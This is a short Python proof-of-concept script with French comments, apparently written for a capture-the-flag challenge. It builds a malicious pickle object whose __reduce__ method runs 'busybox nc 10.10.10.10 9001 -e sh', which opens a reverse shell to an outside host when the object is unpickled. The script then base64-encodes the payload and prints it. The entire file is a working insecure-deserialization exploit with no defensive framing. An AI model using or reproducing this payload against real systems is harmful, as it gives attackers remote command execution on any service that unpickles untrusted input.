import pickle
import base64
import os

# Classe Phreaks (utilisée de manière malveillante)
class Phreaks:
    def __init__(self, hacker_handle, category, id):
        self.hacker_handle = hacker_handle
        self.category = category
        self.id = id
    
    def __reduce__(self):
        cmd = ('busybox nc 10.10.10.10 9001 -e sh')
        return os.system, (cmd,)

# Création d'un objet Phreaks malveillant
obj_malveillant = Phreaks('Skrill', 'Rev', 12345)

# Sérialisation de l'objet malveillant
obj_pickled = pickle.dumps(obj_malveillant)
encoded_obj = base64.b64encode(obj_pickled)

# Affichage de l'objet Pickle encodé pour le POC
print("Objet Pickle encodé pour le POC :", encoded_obj)
